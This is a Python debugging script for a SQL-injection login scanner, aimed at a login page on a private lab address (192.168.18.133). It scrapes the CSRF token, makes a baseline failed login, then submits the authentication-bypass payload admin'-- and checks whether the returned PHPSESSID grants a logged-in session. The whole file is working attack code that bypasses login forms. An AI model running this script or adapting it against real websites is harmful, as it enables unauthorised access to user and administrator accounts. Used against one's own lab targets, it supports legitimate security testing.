"""LoginSqliScanner 调试"""
import asyncio
import aiohttp
import re

LOGIN_URL = 'http://192.168.18.133/index.php?page=login'

async def get_csrf(session, url):
    async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
        text = await resp.text()
    token_names = ["token", "user_name", "user_token", "csrf_token", "_token"]
    for name in token_names:
        m = re.search(
            rf'<input[^>]+type=["\']?hidden["\']?[^>]+name=["\']?{re.escape(name)}["\']?[^>]+value=["\']([^"\']+)["\']',
            text, re.I)
        if not m:
            m = re.search(
                rf'<input[^>]+name=["\']?{re.escape(name)}["\']?[^>]+value=["\']([^"\']+)["\']',
                text, re.I)
        if m and len(m.group(1)) > 5:
            print(f"  CSRF token found: {name} = {m.group(1)[:15]}...")
            return name, m.group(1)
    print(f"  CSRF token: NOT FOUND (page len={len(text)})")
    print(f"  Form snippet: {text[500:1000]}")
    return None, None

async def post_login(session, url, data):
    # 清理 None
    data = {k: v for k, v in data.items() if v is not None}
    async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=5),
                            allow_redirects=False) as resp:
        text = await resp.text()
        cookies = {k: v.value for k, v in session.cookie_jar.filter_cookies(resp.url or url).items()}
        return resp.status, text, cookies, resp.headers.get('Set-Cookie', '')

async def validate_session(session, base_url):
    paths = ['/index.php?page=profile', '/index.php?page=home', '/index.php']
    for p in paths:
        from urllib.parse import urljoin
        u = urljoin(base_url.split('?')[0], p)
        async with session.get(u, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            text = await resp.text()
            is_login = 'password' in text[:300] and 'login' in text[:300]
            print(f"    validate {p}: status={resp.status} is_login={is_login}")
            if not is_login:
                return True
    return False

async def main():
    async with aiohttp.ClientSession() as session:
        # Step 1: GET login
        print("1. GET login page")
        token_name, token_val = await get_csrf(session, LOGIN_URL)

        # Step 2: Baseline POST (wrong creds)
        print("2. Baseline POST (wrong creds)")
        base_status, base_text, base_cookies, base_set_cookie = await post_login(
            session, LOGIN_URL,
            {'user_name': '__wrong__', 'password': '__wrong__', token_name: token_val}
        )
        print(f"  status={base_status} len={len(base_text)} cookies={list(base_cookies.keys())}")
        print(f"  Set-Cookie: {base_set_cookie[:80]}")

        # Step 3: Bypass POST
        print("3. Bypass POST: admin'--")
        # Get fresh token
        token_name2, token_val2 = await get_csrf(session, LOGIN_URL)
        bypass_status, bypass_text, bypass_cookies, bypass_set_cookie = await post_login(
            session, LOGIN_URL,
            {'user_name': "admin'--", 'password': 'wrong', token_name2: token_val2}
        )
        print(f"  status={bypass_status} len={len(bypass_text)} cookies={list(bypass_cookies.keys())}")
        print(f"  Set-Cookie: {bypass_set_cookie[:80]}")
        print(f"  Same as baseline: {len(bypass_text) == len(base_text)}")
        print(f"  Text diff: {abs(len(bypass_text) - len(base_text))} bytes")

        # Step 4: Validate session
        if 'PHPSESSID' in bypass_cookies:
            print("4. PHPSESSID found! Validating session...")
            ok = await validate_session(session, LOGIN_URL)
            print(f"  Session valid: {ok}")
        else:
            print("4. NO PHPSESSID in bypass response")

asyncio.run(main())
